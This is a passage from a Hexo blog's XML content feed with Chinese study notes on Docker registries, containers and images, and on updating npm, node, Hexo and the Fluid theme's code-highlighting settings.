      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Dockerfile</tag>
      
      <tag>Image</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker实践——访问仓库</title>
    <link href="/posts/87094ab1/"/>
    <url>/posts/87094ab1/</url>
    
    <content type="html"><![CDATA[<blockquote><p>对于仓库地址 docker.io/ubuntu 来说，docker.io 是注册服务器地址，ubuntu 是仓库名。注册服务器是管理仓库的具体服务器，每个服务器上可以有多个仓库，而每个仓库下面有多个镜像。</p></blockquote><h3 id="Docker-Hub"><a href="#Docker-Hub" class="headerlink" title="Docker Hub"></a>Docker Hub</h3><p><a href="https://hub.docker.com/">Docker Hub</a>是Docker官方维护的一个公共仓库。其中已经包括了数量超过 <a href="https://hub.docker.com/search/?type=image">2,650,000</a> 的镜像。大部分需求都可以通过在 Docker Hub 中直接下载镜像来实现。免费<a href="https://hub.docker.com/">注册</a>后可登陆使用。</p><p>可以通过执行 <code>docker login</code> 命令交互式的输入用户名及密码来完成在命令行界面登录 Docker Hub。你可以通过 <code>docker logout</code> 退出登录。</p><h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><p>你可以通过 <code>docker search</code> 命令来查找官方仓库中的镜像，并利用 <code>docker pull</code> 命令来将它下载到本地。</p><p>例如以 <code>centos</code> 为关键词进行搜索：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker search centosNAME                               DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDcentos                             The official build of CentOS.                   6476      [OK]ansible&#x2F;centos7-ansible            Ansible on Centos7                              133                  [OK]consol&#x2F;centos-xfce-vnc             Centos container with &quot;headless&quot; VNC session…   127                  [OK]···</code></pre></div><p>可以看到返回了很多包含关键字的镜像，其中包括镜像名字、描述、收藏数、是否官方创建（<code>OFFICIAL</code>）、是否自动构建 （<code>AUTOMATED</code>）。</p><p>根据是否是官方提供，可将镜像分为两类。</p><p>一种是类似 <code>centos</code> 这样的镜像，被称为基础镜像或根镜像。这些基础镜像由 Docker 公司创建、验证、支持、提供。这样的镜像往往使用单个单词作为名字。还有一种类型，比如 <code>ansible/centos7-ansible</code> 镜像，它是由 Docker Hub 的注册用户创建并维护的，往往带有用户名称前缀。可以通过前缀 <code>username/</code> 来指定使用某个用户提供的镜像，比如 ansible 用户。</p><p>另外，在查找的时候通过 <code>--filter=stars=N</code> 参数可以指定仅显示收藏数量为 <code>N</code> 以上的镜像。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker search --filter&#x3D;stars&#x3D;100 centosNAME                      DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDcentos                    The official build of CentOS.                   6476      [OK]ansible&#x2F;centos7-ansible   Ansible on Centos7                              133                  [OK]···</code></pre></div><p>下载官方 <code>centos</code> 镜像到本地。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker pull centosUsing default tag: latestlatest: Pulling from library&#x2F;centos7a0437f04f83: Pull completeDigest: sha256:5528e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1Status: Downloaded newer image for centos:latestdocker.io&#x2F;library&#x2F;centos:latest</code></pre></div><h3 id="推送镜像"><a href="#推送镜像" class="headerlink" title="推送镜像"></a>推送镜像</h3><p>用户也可以在登录后通过 <code>docker push</code> 命令来将自己的镜像推送到 Docker Hub。</p><p>以下命令中的 <code>username</code> 请替换为你的 Docker 账号用户名。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; docker image lsREPOSITORY    TAG       IMAGE ID       CREATED        SIZEubuntu        18.04     2c047404e52d   3 months ago   63.3MB&gt; docker tag ubuntu:18.04 leex0&#x2F;ubuntu:18.04&gt; docker image lsREPOSITORY     TAG       IMAGE ID       CREATED        SIZEleex0&#x2F;ubuntu   18.04     2c047404e52d   3 months ago   63.3MBubuntu         18.04     2c047404e52d   3 months ago   63.3MB&gt; docker push leex0&#x2F;ubuntu:18.04The push refers to repository [docker.io&#x2F;leex0&#x2F;ubuntu]fe6d8881187d: Mounted from library&#x2F;ubuntu23135df75b44: Mounted from library&#x2F;ubuntub43408d5f11b: Mounted from library&#x2F;ubuntu18.04: digest: sha256:a7fa45fb43d471f4e66c5b53b1b9b0e02f7f1d37a889a41bbe1601fac70cb54e size: 943&gt; docker search leex0NAME                      DESCRIPTION   STARS     OFFICIAL   AUTOMATEDleex0&#x2F;docker101tutorial                 0</code></pre></div><h3 id="私有仓库"><a href="#私有仓库" class="headerlink" title="*私有仓库"></a>*私有仓库</h3><p>创建私有仓库相关可参考<a href="https://yeasy.gitbook.io/docker_practice/repository/registry">链接</a>。</p><blockquote><p>参考：</p><p><a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Repository</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo博客与Fluid主题更新</title>
    <link href="/posts/76079a7b/"/>
    <url>/posts/76079a7b/</url>
    
    <content type="html"><![CDATA[<blockquote><p>博客较旧未更新，记录一下更新过程。</p><p>同时更改一下目前的代码高亮相关配置。</p><p><strong>注：操作前建议将博客内容自行备份。</strong></p><p><strong>所有操作建议都在博客目录下进行。</strong></p></blockquote><h2 id="更新npm"><a href="#更新npm" class="headerlink" title="更新npm"></a>更新npm</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; sudo npm install -g npm&gt; npm -v6.14.11</code></pre></div><p>期间遇到错误：</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">reason: Hostname&#x2F;IP does not match certificate&#39;s altnames: Host: registry.cnpmjs.org. is not in the cert&#39;s altnames: DNS:r.cnpmjs.org</code></pre></div><p>执行<code>npm config set registry http://registry.npmjs.org</code>重新配置npm的registry即可。</p><h2 id="更新node"><a href="#更新node" class="headerlink" title="更新node"></a>更新node</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; sudo npm install -g n&gt; sudo n stablenode -vv14.16.0</code></pre></div><h2 id="更新Hexo"><a href="#更新Hexo" class="headerlink" title="更新Hexo"></a>更新Hexo</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 以下指令均在Hexo目录下操作，先定位到Hexo目录# 查看当前版本，判断是否需要升级&gt; hexo version# 全局升级hexo-cli&gt; npm i hexo-cli -g# 再次查看版本，看hexo-cli是否升级成功&gt; hexo version# 安装npm-check，若已安装可以跳过&gt; npm install -g npm-check# 检查系统插件是否需要升级&gt; npm-check# 安装npm-upgrade，若已安装可以跳过&gt; npm install -g npm-upgrade# 更新package.json&gt; npm-upgrade# 更新全局插件&gt; npm update -g# 更新系统插件&gt; npm update --save# 再次查看版本，判断是否升级成功&gt; hexo versionINFO  Validating confighexo: 5.4.0hexo-cli: 4.2.0os: Darwin 20.3.0 darwin x64node: 14.16.0v8: 8.4.371.19-node.18uv: 1.40.0zlib: 1.2.11brotli: 1.0.9ares: 1.16.1modules: 83nghttp2: 1.41.0napi: 7llhttp: 2.1.3openssl: 1.1.1jcldr: 37.0icu: 67.1tz: 2020aunicode: 13.0</code></pre></div><h2 id="更新Fluid主题"><a href="#更新Fluid主题" class="headerlink" title="更新Fluid主题"></a>更新Fluid主题</h2><blockquote><p>根据<a href="https://github.com/fluid-dev/hexo-theme-fluid">主题介绍</a>，较为简单的方式为使用npm安装也易于维护。</p></blockquote><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npm install --save hexo-theme-fluidnpm update --save hexo-theme-fluid</code></pre></div><h3 id="主题配置说明"><a href="#主题配置说明" class="headerlink" title="主题配置说明"></a>主题配置说明</h3><p>若之前采用解压方式使用主题，主题文件将会在<code>/blog/themes/fluid</code>下存储。</p><p>采用npm安装后，主题文件存放于<code>/blog/node_modules/hexo-theme-fluid</code>。</p><p><strong>采用npm安装后注意将之前存放的静态文件与配置同步到新存放位置。</strong></p><p>同时将两者配置文件进行同步，因为新版本中字段使用可能与老版本不同，直接覆盖配置文件可能导致无法使用。</p><p>Hexo 5.0.0 版本以上的用户，在博客目录下创建 <code>/blog/_config.fluid.yml</code> 文件，将主题的<code>/blog/node_modules/hexo-theme-fluid/_config.yml</code>内容复制过去。</p><p>以后如果修改任何主题配置，都只需修改 <code>_config.fluid.yml</code> 的配置即可。</p><h3 id="代码高亮显示"><a href="#代码高亮显示" class="headerlink" title="代码高亮显示"></a>代码高亮显示</h3><p>之前的高亮显示不明显，修改一下高亮显示配置。</p><p>在之前的配置文件中<code>/blog/_config.yml</code>，高亮为如下配置：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">highlight:  enable: true  auto_detect: false  line_number: true  tab_replace: &#39;&#39;  wrap: true  hljs: falseprismjs:  enable: false  preprocess: true  line_number: true  tab_replace: &#39;&#39;</code></pre></div><p>现选择<code>prismjs</code>为高亮配置：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">highlight:  enable: false  auto_detect: false  line_number: true  tab_replace: &#39;&#39;  wrap: true  hljs: falseprismjs:  enable: true  preprocess: true  line_number: true  tab_replace: &#39;&#39;</code></pre></div><p>同时在<code>/blog/_config.fluid.yml</code>中将<code>lib: &quot;highlightjs&quot;</code>：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">highlight:    enable: true    line_number: true    # Highlight library    # Options: highlightjs | prismjs    lib: &quot;highlightjs&quot;        highlightjs:      style: &quot;Github Gist&quot;      bg_color: false    prismjs:      style: &quot;default&quot;      preprocess: false</code></pre></div><p>修改为<code>lib: &quot;prismjs&quot;</code>：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">highlight:    enable: true    line_number: true    # Highlight library    # Options: highlightjs | prismjs    lib: &quot;prismjs&quot;        highlightjs:      style: &quot;Github Gist&quot;      bg_color: false    prismjs:      style: &quot;default&quot;      preprocess: false</code></pre></div><blockquote><p>参考：</p><p><a href="https://hexo.io/zh-cn/docs/syntax-highlight.html">https://hexo.io/zh-cn/docs/syntax-highlight.html</a></p><p><a href="https://github.com/fluid-dev/hexo-theme-fluid">https://github.com/fluid-dev/hexo-theme-fluid</a></p><p><a href="https://www.imczw.com/post/tech/hexo5-next8-updated.html">https://www.imczw.com/post/tech/hexo5-next8-updated.html</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
      <tag>Hexo</tag>
      
      <tag>Fluid</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker实践——操作容器</title>
    <link href="/posts/e4b4fa4b/"/>
    <url>/posts/e4b4fa4b/</url>
    
    <content type="html"><![CDATA[<h2 id="1-启动"><a href="#1-启动" class="headerlink" title="1. 启动"></a>1. 启动</h2><h3 id="新建并启动"><a href="#新建并启动" class="headerlink" title="新建并启动"></a>新建并启动</h3><p>所需要的命令主要为 <code>docker run</code>。</p><p>例如，下面的命令输出一个 “Hello World”，之后终止容器。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker run ubuntu:18.04 &#x2F;bin&#x2F;echo &#39;Hello world&#39;Hello world</code></pre></div><p>这跟在本地直接执行 <code>/bin/echo &#39;hello world&#39;</code> 几乎感觉不出任何区别。</p><p>下面的命令则启动一个 bash 终端，允许用户进行交互。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker run -t -i ubuntu:18.04 &#x2F;bin&#x2F;bashroot@af8bae53bdd3:&#x2F;#</code></pre></div><p>其中，<code>-t</code> 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， <code>-i</code> 则让容器的标准输入保持打开。</p><p>在交互模式下，用户可以通过所创建的终端来输入命令，例如</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@74e4ce548f2e:&#x2F;# pwd&#x2F;root@74e4ce548f2e:&#x2F;# lsbin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  varroot@74e4ce548f2e:&#x2F;#</code></pre></div><p>当利用 <code>docker run</code> 来创建容器时，Docker 在后台运行的标准操作包括：</p><ul><li>检查本地是否存在指定的镜像，不存在就从 <a href="">registry</a> 下载</li><li>利用镜像创建并启动一个容器</li><li>分配一个文件系统，并在只读的镜像层外面挂载一层可读写层</li><li>从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中去</li><li>从地址池配置一个 ip 地址给容器</li><li>执行用户指定的应用程序</li><li>执行完毕后容器被终止</li></ul><h3 id="启动已终止容器"><a href="#启动已终止容器" class="headerlink" title="启动已终止容器"></a>启动已终止容器</h3><p>可以利用 <code>docker container start</code> 命令，直接将一个已经终止（<code>exited</code>）的容器启动运行。</p><p>容器的核心为所执行的应用程序，所需要的资源都是应用程序运行所必需的。除此之外，并没有其它的资源。可以在伪终端中利用 <code>ps</code> 或 <code>top</code> 来查看进程信息。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@ba267838cc1b:&#x2F;# ps  PID TTY          TIME CMD    1 ?        00:00:00 bash   11 ?        00:00:00 ps</code></pre></div><p>可见，容器中仅运行了指定的 bash 应用。这种特点使得 Docker 对资源的利用率极高，是货真价实的轻量级虚拟化。</p><h2 id="2-守护态运行"><a href="#2-守护态运行" class="headerlink" title="2. 守护态运行"></a>2. 守护态运行</h2><p>更多的时候，需要让 Docker 在后台运行而不是直接把执行命令的结果输出在当前宿主机下。此时，可以通过添加 <code>-d</code> 参数来实现。</p><p>下面举两个例子来说明一下。</p><p>如果不使用 <code>-d</code> 参数运行容器。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker run ubuntu:18.04 &#x2F;bin&#x2F;sh -c &quot;while true; do echo hello world; sleep 1; done&quot;hello worldhello worldhello worldhello world</code></pre></div><p>容器会把输出的结果 (STDOUT) 打印到宿主机上面</p><p>如果使用了 <code>-d</code> 参数运行容器。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker run -d ubuntu:18.04 &#x2F;bin&#x2F;sh -c &quot;while true; do echo hello world; sleep 1; done&quot;439564c20b1720238739ce01c54e7d6dcda6284a3a8f8994c9d28097cad72790</code></pre></div><p>此时容器会在后台运行并不会把输出的结果 (STDOUT) 打印到宿主机上面(输出结果可以用 <code>docker logs</code> 查看)。</p><blockquote><p><strong>注：</strong> 容器是否会长久运行，是和 <code>docker run</code> 指定的命令有关，和 <code>-d</code> 参数无关。</p></blockquote><p>使用 <code>-d</code> 参数启动后会返回一个唯一的 id，也可以通过 <code>docker container ls</code> 命令来查看容器信息。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container lsCONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS     NAMES439564c20b17   ubuntu:18.04   &quot;&#x2F;bin&#x2F;sh -c &#39;while t…&quot;   6 minutes ago   Up 6 minutes             ecstatic_antonelli</code></pre></div><p>要获取容器的输出信息，可以通过 <code>docker container logs</code> 命令。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container logs [container ID or NAMES]hello worldhello worldhello world. . .</code></pre></div><h2 id="3-终止"><a href="#3-终止" class="headerlink" title="3. 终止"></a>3. 终止</h2><p>可以使用 <code>docker container stop</code> 来终止一个运行中的容器。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container stop 439439</code></pre></div><p>此外，当 Docker 容器中指定的应用终结时，容器也自动终止。</p><p>例如对于上一章节中只启动了一个终端的容器，用户通过 <code>exit</code> 命令或 <code>Ctrl+d</code> 来退出终端时，所创建的容器立刻终止。</p><p>终止状态的容器可以用 <code>docker container ls -a</code> 命令看到。例如</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container ls -aCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS                        PORTS     NAMES439564c20b17   ubuntu:18.04   &quot;&#x2F;bin&#x2F;sh -c &#39;while t…&quot;   9 minutes ago    Exited (137) 38 seconds ago             ecstatic_antonelli98f27ac5ddc4   ubuntu:18.04   &quot;&#x2F;bin&#x2F;sh -c &#39;while t…&quot;   9 minutes ago    Exited (0) 9 minutes ago                unruffled_shirley74e4ce548f2e   ubuntu:18.04   &quot;&#x2F;bin&#x2F;bash&quot;              16 minutes ago   Exited (0) 15 minutes ago               ecstatic_jemison5cc8c294fe40   ubuntu:18.04   &quot;&#x2F;bin&#x2F;echo &#39;Hello wo…&quot;   17 minutes ago   Exited (0) 17 minutes ago               vibrant_buck</code></pre></div><p>处于终止状态的容器，可以通过 <code>docker container start</code> 命令来重新启动。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container start 439439</code></pre></div><p>此外，<code>docker container restart</code> 命令会将一个运行态的容器终止，然后再重新启动它。</p><h2 id="4-进入容器"><a href="#4-进入容器" class="headerlink" title="4. 进入容器"></a>4. 进入容器</h2><p>在使用 <code>-d</code> 参数时，容器启动后会进入后台。</p><p>某些时候需要进入容器进行操作，包括使用 <code>docker attach</code> 命令或 <code>docker exec</code> 命令，推荐大家使用 <code>docker exec</code> 命令，原因会在下面说明。</p><h3 id="attach-命令"><a href="#attach-命令" class="headerlink" title="attach 命令"></a><code>attach</code> 命令</h3><p>下面示例如何使用 <code>docker attach</code> 命令。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker run -dit ubuntuf780a070123a203ab14b1632c9fe51850568baa8ae906e1fc006f21b1b763cde$ docker container lsCONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMESf780a070123a   ubuntu    &quot;&#x2F;bin&#x2F;bash&quot;   7 seconds ago   Up 6 seconds             interesting_almeida$ docker attach f780root@f780a070123a:&#x2F;# pwd&#x2F;root@f780a070123a:&#x2F;#</code></pre></div><p><em>注意：</em> 如果从这个 stdin 中 exit，会导致容器的停止。</p><h3 id="exec-命令"><a href="#exec-命令" class="headerlink" title="exec 命令"></a><code>exec</code> 命令</h3><p><code>-i</code> <code>-t</code> 参数</p><p><code>docker exec</code> 后边可以跟多个参数，这里主要说明 <code>-i</code> <code>-t</code> 参数。</p><p>只用 <code>-i</code> 参数时，由于没有分配伪终端，界面没有我们熟悉的 Linux 命令提示符，但命令执行结果仍然可以返回。</p><p>当 <code>-i</code> <code>-t</code> 参数一起使用时，则可以看到我们熟悉的 Linux 命令提示符。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker run -dit ubuntubf85753fd26a3af4ee9a600dd41010e5f6f6ea2a7eb059dd017010d7f47f99b7$ docker container lsCONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMESbf85753fd26a   ubuntu    &quot;&#x2F;bin&#x2F;bash&quot;   7 seconds ago   Up 7 seconds             loving_tharp$ docker exec -i bf857 bashlsbinboot...$ docker exec -it bf857 bashroot@bf85753fd26a:&#x2F;# pwd&#x2F;root@bf85753fd26a:&#x2F;#</code></pre></div><p>如果从这个 stdin 中 exit，不会导致容器的停止。这就是为什么推荐大家使用 <code>docker exec</code> 的原因。</p><p>更多参数说明请使用 <code>docker exec --help</code> 查看。</p><h2 id="5-导出和导入"><a href="#5-导出和导入" class="headerlink" title="5. 导出和导入"></a>5. 导出和导入</h2><h3 id="导出容器"><a href="#导出容器" class="headerlink" title="导出容器"></a>导出容器</h3><p>如果要导出本地某个容器，可以使用 <code>docker export</code> 命令。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container ls -aCONTAINER ID   IMAGE          COMMAND                  CREATED          STATUS                       PORTS     NAMESbf85753fd26a   ubuntu         &quot;&#x2F;bin&#x2F;bash&quot;              5 minutes ago    Up 5 minutes                           loving_tharpf780a070123a   ubuntu         &quot;&#x2F;bin&#x2F;bash&quot;              7 minutes ago    Exited (0) 6 minutes ago               interesting_almeida$ docker export bf8 &gt; ubuntu.tar</code></pre></div><p>这样将导出容器快照到本地文件。</p><h3 id="导入容器快照"><a href="#导入容器快照" class="headerlink" title="导入容器快照"></a>导入容器快照</h3><p>可以使用 <code>docker import</code> 从容器快照文件中再导入为镜像，例如</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker import ubuntu.tar test&#x2F;ubuntu:v1.0sha256:a2096fd67aaa28187fda28a9c3c6a1f9184a13c589f0f5d9eb11dd554cb8d6e5$ docker image lsREPOSITORY    TAG       IMAGE ID       CREATED          SIZEtest&#x2F;ubuntu   v1.0      a2096fd67aaa   10 seconds ago   72.9MBhello-world   latest    d1165f221234   2 weeks ago      13.3kBubuntu        latest    f643c72bc252   3 months ago     72.9MBubuntu        18.04     2c047404e52d   3 months ago     63.3MB</code></pre></div><p>此外，也可以通过指定 URL 或者某个目录来导入，例如</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker import http:&#x2F;&#x2F;example.com&#x2F;exampleimage.tgz example&#x2F;imagerepo</code></pre></div><p><em>注：用户既可以使用</em> <em><code>docker load</code></em> <em>来导入镜像存储文件到本地镜像库，也可以使用</em> <em><code>docker import</code></em> <em>来导入一个容器快照到本地镜像库。这两者的区别在于容器快照文件将丢弃所有的历史记录和元数据信息（即仅保存容器当时的快照状态），而镜像存储文件将保存完整记录，体积也要大。此外，从容器快照文件导入时可以重新指定标签等元数据信息。</em></p><h2 id="6-删除容器"><a href="#6-删除容器" class="headerlink" title="6. 删除容器"></a>6. 删除容器</h2><p>可以使用 <code>docker container rm</code> 来删除一个处于终止状态的容器。例如</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container lsCONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS     NAMESbf85753fd26a   ubuntu    &quot;&#x2F;bin&#x2F;bash&quot;   43 minutes ago   Up 43 minutes             loving_tharp$ docker container rm bf85Error response from daemon: You cannot remove a running container bf85753fd26a3af4ee9a600dd41010e5f6f6ea2a7eb059dd017010d7f47f99b7. Stop the container before attempting removal or force remove$ docker container stop bf85bf85$ docker container rm bf85bf85</code></pre></div><p>如果要删除一个运行中的容器，可以添加 <code>-f</code> 参数。Docker 会发送 <code>SIGKILL</code> 信号给容器。</p><h3 id="清理所有处于终止状态的容器"><a href="#清理所有处于终止状态的容器" class="headerlink" title="清理所有处于终止状态的容器"></a>清理所有处于终止状态的容器</h3><p>用 <code>docker container ls -a</code> 命令可以查看所有已经创建的包括终止状态的容器，如果数量太多要一个个删除可能会很麻烦，用下面的命令可以清理掉所有处于终止状态的容器。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker container prune</code></pre></div><blockquote><p>参考：</p><p><a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Container</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker实践——使用镜像</title>
    <link href="/posts/10030fa9/"/>
    <url>/posts/10030fa9/</url>
    
    <content type="html"><![CDATA[<h3 id="1-获取镜像"><a href="#1-获取镜像" class="headerlink" title="1. 获取镜像"></a>1. 获取镜像</h3><p>从 Docker 镜像仓库获取镜像的命令是 <code>docker pull</code>。其命令格式为：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker pull [选项] [Docker Registry 地址[:端口号]&#x2F;]仓库名[:标签]</code></pre></div><p>具体的选项可以通过 <code>docker pull --help</code> 命令看到，这里我们说一下镜像名称的格式。</p><ul><li>Docker 镜像仓库地址：地址的格式一般是 <code>&lt;域名/IP&gt;[:端口号]</code>。默认地址是 Docker Hub(<code>docker.io</code>)。</li><li>仓库名：如之前所说，这里的仓库名是两段式名称，即 <code>&lt;用户名&gt;/&lt;软件名&gt;</code>。对于 Docker Hub，如果不给出用户名，则默认为 <code>library</code>，也就是官方镜像。</li></ul><p>比如：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker pull ubuntu:18.0418.04: Pulling from library&#x2F;ubuntu92dc2a97ff99: Pull completebe13a9d27eb8: Pull completec8299583700a: Pull completeDigest: sha256:4bc3ae6596938cb0d9e5ac51a1152ec9dcac2a1c50829c74abd9c4361e321b26Status: Downloaded newer image for ubuntu:18.04docker.io&#x2F;library&#x2F;ubuntu:18.04</code></pre></div><p>上面的命令中没有给出 Docker 镜像仓库地址，因此将会从 Docker Hub （<code>docker.io</code>）获取镜像。而镜像名称是 <code>ubuntu:18.04</code>，因此将会获取官方镜像 <code>library/ubuntu</code> 仓库中标签为 <code>18.04</code> 的镜像。<code>docker pull</code> 命令的输出结果最后一行给出了镜像的完整名称，即： <code>docker.io/library/ubuntu:18.04</code>。</p><p>从下载过程中可以看到表现出了分层存储的概念，镜像是由多层存储所构成。下载也是一层层的去下载，并非单一文件。</p><p>下载过程中给出了每一层的 ID 的前 12 位。并且下载结束后，给出该镜像完整的 <code>sha256</code> 的摘要，以确保下载一致性。</p><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>有了镜像后，我们就能够以这个镜像为基础启动并运行一个容器。以上面的 <code>ubuntu:18.04</code> 为例，如果我们打算启动里面的 <code>bash</code> 并且进行交互式操作的话，可以执行下面的命令。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker run -it --rm ubuntu:18.04 bashroot@e7009c6ce357:&#x2F;# cat &#x2F;etc&#x2F;os-releaseNAME&#x3D;&quot;Ubuntu&quot;VERSION&#x3D;&quot;18.04.1 LTS (Bionic Beaver)&quot;ID&#x3D;ubuntuID_LIKE&#x3D;debianPRETTY_NAME&#x3D;&quot;Ubuntu 18.04.1 LTS&quot;VERSION_ID&#x3D;&quot;18.04&quot;HOME_URL&#x3D;&quot;https:&#x2F;&#x2F;www.ubuntu.com&#x2F;&quot;SUPPORT_URL&#x3D;&quot;https:&#x2F;&#x2F;help.ubuntu.com&#x2F;&quot;BUG_REPORT_URL&#x3D;&quot;https:&#x2F;&#x2F;bugs.launchpad.net&#x2F;ubuntu&#x2F;&quot;PRIVACY_POLICY_URL&#x3D;&quot;https:&#x2F;&#x2F;www.ubuntu.com&#x2F;legal&#x2F;terms-and-policies&#x2F;privacy-policy&quot;VERSION_CODENAME&#x3D;bionicUBUNTU_CODENAME&#x3D;bionic</code></pre></div><p><code>docker run</code> 就是运行容器的命令，简要的说明一下上面用到的参数（更多参数见“操作容器”一文）。</p><ul><li><code>-it</code>：这是两个参数，一个是 <code>-i</code>：交互式操作，一个是 <code>-t</code> 终端。我们这里打算进入 <code>bash</code> 执行一些命令并查看返回结果，因此我们需要交互式终端。</li><li><code>--rm</code>：这个参数是说容器退出后随之将其删除。默认情况下，为了排障需求，退出的容器并不会立即删除，除非手动 <code>docker rm</code>。我们这里只是随便执行个命令，看看结果，不需要排障和保留结果，因此使用 <code>--rm</code> 可以避免浪费空间。</li><li><code>ubuntu:18.04</code>：这是指用 <code>ubuntu:18.04</code> 镜像为基础来启动容器。</li><li><code>bash</code>：放在镜像名后的是 <strong>命令</strong>，这里我们希望有个交互式 Shell，因此用的是 <code>bash</code>。</li></ul><p>进入容器后，我们可以在 Shell 下操作，执行任何所需的命令。这里，我们执行了 <code>cat /etc/os-release</code>，这是 Linux 常用的查看当前系统版本的命令，从返回的结果可以看到容器内是 <code>Ubuntu 18.04.1 LTS</code> 系统。</p><p>最后我们通过 <code>exit</code> 退出了这个容器。</p><h3 id="2-列出镜像"><a href="#2-列出镜像" class="headerlink" title="2. 列出镜像"></a>2. 列出镜像</h3><p>要想列出已经下载下来的镜像，可以使用 <code>docker image ls</code> 命令。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker image lsREPOSITORY                TAG       IMAGE ID       CREATED        SIZEleex0&#x2F;docker101tutorial   latest    4c500ed7d6b5   28 hours ago   27.9MBdocker101tutorial         latest    4c500ed7d6b5   28 hours ago   27.9MBnginx                     latest    6084105296a9   9 days ago     133MBalpine&#x2F;git                latest    a939554ad0d0   4 weeks ago    25.1MB</code></pre></div><p>列表包含了 <code>仓库名</code>、<code>标签</code>、<code>镜像 ID</code>、<code>创建时间</code> 以及 <code>所占用的空间</code>。</p><p>其中仓库名、标签在之前的基础概念章节已经介绍过了。<strong>镜像 ID</strong> 则是镜像的唯一标识，一个镜像可以对应多个 <strong>标签</strong>。因此，在上面的例子中，我们可以看到 <code>ubuntu:18.04</code> 和 <code>ubuntu:bionic</code> 拥有相同的 ID，因为它们对应的是同一个镜像。</p><h4 id="镜像体积"><a href="#镜像体积" class="headerlink" title="镜像体积"></a>镜像体积</h4><p>使用 <code>docker image ls</code> 命令会与Docker Hub 上看到的镜像大小不同。因为Docker Hub上的镜像体积为压缩过的体积，方便网络传输。</p><p>另外一个需要注意的问题是，<code>docker image ls</code> 